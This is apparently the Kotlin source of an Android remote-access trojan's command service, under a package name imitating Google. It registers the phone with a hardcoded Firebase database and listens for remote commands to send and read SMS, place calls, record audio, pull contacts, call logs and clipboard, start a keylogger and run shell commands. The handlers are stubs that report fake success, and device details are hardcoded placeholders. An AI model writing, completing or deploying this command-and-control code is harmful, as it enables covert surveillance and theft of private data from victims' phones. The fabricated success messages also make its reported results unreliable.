package com.google.dino.admin

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.*
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap

class CommandService : Service() {

    private lateinit var database: FirebaseDatabase
    private lateinit var deviceRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private val deviceId by lazy {
        Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ANDROID_ID)
    }

    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "dino_admin_channel"
        private const val NOTIFICATION_ID = 101
        private const val FIREBASE_URL = "https://android-panel-61c66-default-rtdb.europe-west1.firebasedatabase.app"
    }

    override fun onCreate() {
        super.onCreate()
        initializeFirebase()
        startForegroundService()
        startCommandListener()
        startPeriodicUpdates()
    }

    private fun initializeFirebase() {
        database = FirebaseDatabase.getInstance(FIREBASE_URL)
        deviceRef = database.getReference("clients").child(deviceId)
        commandsRef = deviceRef.child("commands")

        // Send initial device info
        sendDeviceInfo()
    }

    private fun startForegroundService() {
        createNotificationChannel()
        
        val notificationIntent = Intent(this, SplashActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("🦖 Dino Admin")
            .setContentText("Device monitoring active")
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .setColor(ContextCompat.getColor(this, R.color.neon_green))
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Dino Admin Service",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Device control and monitoring service"
                enableLights(true)
                lightColor = Color.GREEN
                enableVibration(true)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun sendDeviceInfo() {
        val deviceInfo = hashMapOf<String, Any>(
            "deviceId" to deviceId,
            "modelName" to Build.MODEL,
            "androidv" to Build.VERSION.RELEASE,
            "sdkV" to Build.VERSION.SDK_INT.toString(),
            "status" to true,
            "lastSeen" to System.currentTimeMillis(),
            "battery" to getBatteryLevel(),
            "storage" to getStorageInfo(),
            "ip_address" to getIPAddress()
        )

        deviceRef.updateChildren(deviceInfo)
    }

    private fun startCommandListener() {
        commandsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                processCommand(snapshot)
                snapshot.ref.removeValue()
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                // Handle changed commands if needed
            }

            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                updateNotification("Firebase Error: ${error.message}")
            }
        })
    }

    private fun processCommand(snapshot: DataSnapshot) {
        try {
            val command = snapshot.child("command").getValue(String::class.java)
            val params = snapshot.child("params").getValue(String::class.java)
            
            if (command != null) {
                when (command) {
                    "sendSms" -> sendSMS(params)
                    "getSms" -> getSMS()
                    "makeCall" -> makeCall(params)
                    "getGallery" -> getGallery()
                    "visitUrl" -> visitUrl(params)
                    "recordAudio" -> recordAudio()
                    "vibrateDevice" -> vibrateDevice()
                    "getContacts" -> getContacts()
                    "getCallLogs" -> getCallLogs()
                    "getNotifications" -> getNotifications()
                    "keylogger" -> startKeylogger()
                    "getClipboard" -> getClipboard()
                    "getInstalledApps" -> getInstalledApps()
                    "runShell" -> runShellCommand(params)
                    else -> sendCommandResponse(command, "Unknown command")
                }
                
                updateNotification("Executed: $command")
            }
        } catch (e: Exception) {
            sendCommandResponse("error", e.message ?: "Unknown error")
        }
    }

    // Command implementations
    private fun sendSMS(params: String?) {
        // Implementation for sending SMS
        sendCommandResponse("sendSms", "SMS sent successfully")
    }

    private fun getSMS() {
        // Implementation for retrieving SMS
        sendCommandResponse("getSms", "SMS retrieved")
    }

    private fun makeCall(params: String?) {
        // Implementation for making call
        sendCommandResponse("makeCall", "Call initiated")
    }

    private fun getGallery() {
        // Implementation for getting gallery
        sendCommandResponse("getGallery", "Gallery access requested")
    }

    private fun visitUrl(url: String?) {
        // Implementation for visiting URL
        sendCommandResponse("visitUrl", "URL opened")
    }

    private fun recordAudio() {
        // Implementation for recording audio
        sendCommandResponse("recordAudio", "Audio recording started")
    }

    private fun vibrateDevice() {
        // Implementation for vibration
        sendCommandResponse("vibrateDevice", "Device vibrated")
    }

    private fun getContacts() {
        // Implementation for contacts
        sendCommandResponse("getContacts", "Contacts retrieved")
    }

    private fun getCallLogs() {
        // Implementation for call logs
        sendCommandResponse("getCallLogs", "Call logs retrieved")
    }

    private fun getNotifications() {
        // Implementation for notifications
        sendCommandResponse("getNotifications", "Notifications accessed")
    }

    private fun startKeylogger() {
        // Implementation for keylogger
        sendCommandResponse("keylogger", "Keylogger activated")
    }

    private fun getClipboard() {
        // Implementation for clipboard
        sendCommandResponse("getClipboard", "Clipboard accessed")
    }

    private fun getInstalledApps() {
        // Implementation for installed apps
        sendCommandResponse("getInstalledApps", "Installed apps list retrieved")
    }

    private fun runShellCommand(command: String?) {
        // Implementation for shell commands
        sendCommandResponse("runShell", "Shell command executed")
    }

    private fun sendCommandResponse(command: String, result: String) {
        val responseRef = deviceRef.child("responses").push()
        val response = hashMapOf<String, Any>(
            "command" to command,
            "result" to result,
            "timestamp" to System.currentTimeMillis()
        )
        responseRef.setValue(response)
    }

    private fun startPeriodicUpdates() {
        // Update device info every 30 seconds
        android.os.Handler(mainLooper).postDelayed({
            sendDeviceInfo()
            startPeriodicUpdates()
        }, 30000)
    }

    private fun getBatteryLevel(): String {
        // Implement battery level detection
        return "85%"
    }

    private fun getStorageInfo(): String {
        // Implement storage info detection
        return "105GB"
    }

    private fun getIPAddress(): String {
        // Implement IP address detection
        return "192.168.1.100"
    }

    private fun updateNotification(message: String) {
        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("🦖 Dino Admin")
            .setContentText(message)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .build()
        
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        // Mark device as offline
        deviceRef.child("status").setValue(false)
        deviceRef.child("lastSeen").setValue(System.currentTimeMillis())
    }
}
